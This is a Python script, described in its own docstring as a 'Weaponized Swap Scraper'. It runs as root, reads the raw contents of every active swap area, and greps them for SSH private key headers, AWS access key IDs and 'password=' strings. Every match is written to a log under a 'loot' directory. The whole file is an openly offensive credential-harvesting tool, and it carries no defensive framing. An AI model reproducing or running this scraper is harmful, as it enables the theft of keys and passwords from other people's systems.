import os
import sys
import re

def scrape_swap(output_file):
    """
    Weaponized Swap Scraper: Scans the system swap space for 
    sensitive patterns (API keys, SSH keys, passwords).
    """
    if os.geteuid() != 0:
        print("[-] ROOT REQUIRED: Swap access requires UID 0.")
        sys.exit(1)

    # Patterns: 1. SSH Private Keys | 2. AWS Keys | 3. Potential Passwords
    patterns = {
        "SSH_KEY": re.compile(b"-----BEGIN [A-Z ]+ PRIVATE KEY-----"),
        "AWS_KEY": re.compile(b"AKIA[0-9A-Z]{16}"),
        "PG_PASS": re.compile(b"password=[a-zA-Z0-9]{8,}")
    }

    print("[*] Locating active swap areas...")
    swap_list = []
    with open("/proc/swaps", "r") as f:
        lines = f.readlines()[1:] # Skip header
        for line in lines:
            swap_list.append(line.split()[0])

    if not swap_list:
        print("[-] No active swap found.")
        return

    print(f"[*] Targeting {len(swap_list)} swap area(s). Starting scrape...")

    try:
        for swap_path in swap_list:
            print(f"[*] Scanning {swap_path}...")
            with open(swap_path, "rb") as s:
                # We read in large chunks to avoid RAM exhaustion
                chunk_size = 1024 * 1024 * 50 # 50MB Chunks
                while True:
                    data = s.read(chunk_size)
                    if not data:
                        break
                    
                    for name, regex in patterns.items():
                        matches = regex.findall(data)
                        if matches:
                            print(f"[!!!] FOUND {len(matches)} matches for {name}")
                            with open(output_file, "ab") as log:
                                for m in matches:
                                    log.write(f"[{name}] ".encode() + m + b"\n")
                                    
        print(f"[!] SUCCESS: Scraping complete. Results in {output_file}")
        
    except Exception as e:
        print(f"[-] Scraper Fault: {e}")

if __name__ == "__main__":
    out = "../../../loot/swap_harvest.log"
    scrape_swap(out)
